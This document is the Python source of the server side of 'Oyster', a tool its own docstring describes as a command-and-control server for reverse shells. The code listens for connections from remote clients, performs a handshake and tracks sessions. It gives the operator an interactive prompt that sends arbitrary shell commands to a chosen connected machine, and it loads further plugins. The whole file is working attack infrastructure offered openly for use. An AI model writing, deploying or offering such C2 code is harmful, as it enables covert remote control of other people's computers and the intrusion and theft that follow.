from __future__ import print_function
import sys
import threading
import socket
from time import sleep
import os
from os import execv
from common import PluginRunner, LoopController, ThreadControl, safe_input
from connection import Connection, ConnectionManager


thread_control = {
    'ACCEPT_CONNECTIONS': True
}


class Server(PluginRunner):
    """
    A simple command and control server(Reverse Shell).
    """
    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, header=True):
        self.header = header
        header = """\n .oOOOo.
.O     o.
O       o               O
o       O              oOo
O       o O   o .oOo    o   .oOo. `OoOo.
o       O o   O `Ooo.   O   OooO'  o
`o     O' O   o     O   o   O      O
 `OoooO'  `OoOO `OoO'   `oO `OoO'  o
              o
           OoO'                         """
        if self.header:
            print(header, end='\n\n')
        self.host = host
        self.port = int(port)
        self.recv_size = int(recv_size)
        self.listen = int(listen)
        self.bind_retry = bind_retry

        self.socket = None
        self.reboot = False

        self.connection_mgr = ConnectionManager()
        self.create_socket()
        self.bind_socket()

    def send_command(self, data, echo=False, encode=True, file_response=False):
        """
        Shortcut to send a command to the currently connected client in the connection manager.

        :param data:
        :param echo:
        :param encode:
        :param file_response:
        :return:
        """

        response = self.connection_mgr.send_command(data, echo=echo, encode=encode, file_response=file_response)
        return response

    def create_socket(self):
        """
        Create the socket.

        :return:
        """

        try:
            self.socket = socket.socket()
        except socket.error as error_message:
            print('< Could not create socket:', error_message, '>')
            sys.exit()
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return self

    def bind_socket(self, attempts=1):
        """
        Bind the socket to the port.

        :return:
        """

        print('< Starting on port', self.port, end=', ')
        try:
            # Bind & start listening.
            self.socket.bind((self.host, self.port))
            self.socket.listen(self.listen)
            print('waiting for client connections. >', end='\n\n')

        except socket.error as error_message:
            print('< Could not bind the socket:', error_message, '\n', 'Trying again. >')
            sleep(1)

            # Try to bind the socket 5 times before giving up.
            if attempts == self.bind_retry:
                print('< Could not bind the socket to the port after {} tries.  Aborting. >'.format(self.bind_retry))
                sys.exit()
            self.bind_socket(attempts=attempts + 1)
        return self

    def listener(self):
        """
        Start listening for connections.

        :return:
        """

        while thread_control['ACCEPT_CONNECTIONS']:
            try:
                conn, address = self.socket.accept()
            except socket.error as e:
                # Loop indefinitely
                continue

            # Check to see if the address is already connected.
            if address[0] in self.connection_mgr.connections.keys():
                continue

            conn_obj = Connection(conn, address, recv_size=self.recv_size)
            should_connect = conn_obj.send_command('oyster handshake {}'.format(self.connection_mgr.session_id))
            should_connect = True if should_connect == 'True' else False
            if should_connect:
                self.connection_mgr.add_connection(conn, address)
            else:
                conn_obj.close()

            # Send the connection it's ip and port
            conn_obj.send_command('oyster set-ip {}'.format(address[0]))
            conn_obj.send_command('oyster set-port {}'.format(address[1]))

            if not thread_control['ACCEPT_CONNECTIONS']:
                self.connection_mgr.remove_connection(conn_obj)
                conn_obj.close()
                return
            print(
                '\r< [ Listener Thread ] {} ({}) connected. >\n{}'.format(
                    address[0],
                    address[1],
                    'Oyster> '
                ),
                end=''
            )

        print('\n< [ Listener Thread ] Connections no longer being accepted! >')
        print('< Closing connections. >')
        self.connection_mgr.close_all_connections()
        return

    def set_cli(self, the_string):
        """
        Set the command line to equal a certain string.

        :param the_string:
        :return:
        """

        print(the_string, end='')
        return self

    def get_server_plugins(self):
        """
        Dynamically import any server_plugins in the `server_plugins` package.
        :return:
        """

        plugin_list = []
        # Get the filepath of the server plugins based on the filepath of the this file.
        fp = __file__.replace(__file__.split('/')[-1], '') + 'server_plugins'
        # Get the names of the modules within the server_plugins folder.
        module_names = [n.replace('.py', '').replace('.pyc', '') for n in os.listdir(fp) if '__init__.py' not in n]
        hidden_files = [n for n in os.listdir(fp) if n[0] == '.']
        module_names = [n for n in module_names if n not in hidden_files]

        try:
            module_names.remove('__pycache__')
        except ValueError:
            pass

        for module_name in module_names:
            # Import the module by name
            module = __import__('server_plugins.' + module_name, fromlist=[''])
            # Add the module to the plugin list
            plugin_list.append(module)

        return plugin_list

    def get_shell_plugins(self):
        """
        Dynamically import any shell_plugins in the `shell_plugins` package.
        :return:
        """

        plugin_list = []
        # Get the filepath of the shell plugins based on the filepath of the this file.
        fp = __file__.replace(__file__.split('/')[-1], '') + 'shell_plugins'
        # Get the names of the modules within the shell_plugins folder.
        module_names = [n.replace('.py', '').replace('.pyc', '') for n in os.listdir(fp) if '__init__.py' not in n]
        try:
            module_names.remove('__pycache__')
        except ValueError:
            pass

        for module_name in module_names:
            # Import the module by name
            module = __import__('shell_plugins.' + module_name, fromlist=[''])
            # Add the module to the plugin list
            plugin_list.append(module)

        return plugin_list

    def start_client_shell(self):
        """
        Open up a client shell using the current connection.

        :return:
        """

        plugin_list = self.get_server_plugins()

        self.connection_mgr.send_command('oyster getcwd')
        while True:
            if self.connection_mgr.current_connection is None:
                return

            # Get the client IP to display in the input string along with the current working directory
            input_string = "<{}> {}".format(self.connection_mgr.send_command('oyster get-ip'), self.connection_mgr.cwd)
            if self.connection_mgr.current_connection is None:
                return
            # If the connection was closed for some reason, return which will end the client shell.
            if self.connection_mgr.current_connection.status == 'CLOSED':
                return

            # Get a command from the user using the crafted input string.
            command = safe_input(input_string)

            # # # # # # # PROCESS PLUGINS # # # # # # #
            plugin_ran, obj = self.process_plugins(plugin_list, command)
            if plugin_ran:
                lc = None
                # Set the lc variable to match the obj if we got a LoopController
                if isinstance(obj, LoopController):
                    lc = obj

                # If we got a ThreadControl as obj, set the thread_control
                # keys/values and set the lc variable to equal the obj's
                # loop_control attribute.
                if isinstance(obj, ThreadControl):
                    try:
                        iterator = obj.control_dictionary.iteritems()
                    except AttributeError:
                        iterator = obj.control_dictionary.items()
                    for k, v in iterator:
                        thread_control[k] = v
                    lc = obj.loop_control

                # If the lc variable is a LoopController, do the normal
                # loop controlling checks.
                if isinstance(lc, LoopController):
                    if lc.should_break:
                        break
                    if lc.should_return:
                        return obj.return_value
                    if lc.should_continue:
                        continue
                continue

            # Send command through.
            try:
                response = self.connection_mgr.send_command(command)
            except BrokenPipeError as err_msg:
                print(err_msg)
                break
            print(response, end='')
        return

    def open_oyster(self):
        """
        Run the Oyster shell.

        :return:
        """

        plugin_list = self.get_shell_plugins()

        sleep(1)
        while True:
            command = safe_input('\rOyster> ')

            # # # # # # # PROCESS PLUGINS # # # # # # #
            plugin_ran, obj = self.process_plugins(plugin_list, command)
            if plugin_ran:
                lc = None
                # Set the lc variable to match the obj if we got a LoopController
                if isinstance(obj, LoopController):
                    lc = obj

                # If we got a ThreadControl as obj, set the thread_control
                # keys/values and set the lc variable to equal the obj's
                # loop_control attribute.
                if isinstance(obj, ThreadControl):
                    try:
                        iterator = obj.control_dictionary.iteritems()
                    except AttributeError:
                        iterator = obj.control_dictionary.items()
                    for k, v in iterator:
                        thread_control[k] = v
                    lc = obj.loop_control

                # If the lc variable is a LoopController, do the normal
                # loop controlling checks.
                if isinstance(lc, LoopController):
                    if lc.should_break:
                        break
                    if lc.should_return:
                        return obj.return_value
                    if lc.should_continue:
                        continue
                continue

            if len(command) > 0:
                if self.connection_mgr.current_connection is not None:
                    print(self.connection_mgr.send_command(command))
        return

    def reboot_self(self):
        """
        Reboot the server.py script.

        :return:
        """

        restart_arguments = list(sys.argv)
        restart_arguments.insert(0, '')
        execv(sys.executable, restart_arguments)
        sys.exit()


if __name__ == '__main__':
    # Set some default values.
    the_host = ''
    the_port = 6667
    the_recv_size = 1024
    the_listen = 10
    the_bind_retry = 5

    def check_cli_arg(arg):
        """
        Check command line argument and manipulate the variable
        that it controls if it matches.

        :param arg:
        :return:
        """

        global the_host
        global the_port
        global the_recv_size
        global the_listen
        global the_bind_retry

        if 'host=' in arg:
            the_host = arg.split('=')[1]
        elif 'port=' in arg:
            the_port = int(arg.split('=')[1])
        elif 'recv_size=' in arg:
            the_recv_size = int(arg.split('=')[1])
        elif 'listen=' in arg:
            the_listen = int(arg.split('=')[1])
        elif 'bind_retry=' in arg:
            the_bind_retry = int(arg.split('=')[1])

    # Check all the command line arguments
    for argument in sys.argv[1:]:
        check_cli_arg(argument)

    server = Server(
        host=the_host,
        port=the_port,
        recv_size=the_recv_size,
        listen=the_listen,
        bind_retry=the_bind_retry,
    )

    # Start the thread that accepts connections.
    connection_accepter = threading.Thread(target=server.listener)
    connection_accepter.setDaemon(True)
    connection_accepter.start()

    # Start the Oyster Shell.
    server.open_oyster()

    # Handle the shutdown sequence.
    connection_accepter.join()

    print('< Shutdown complete! >')
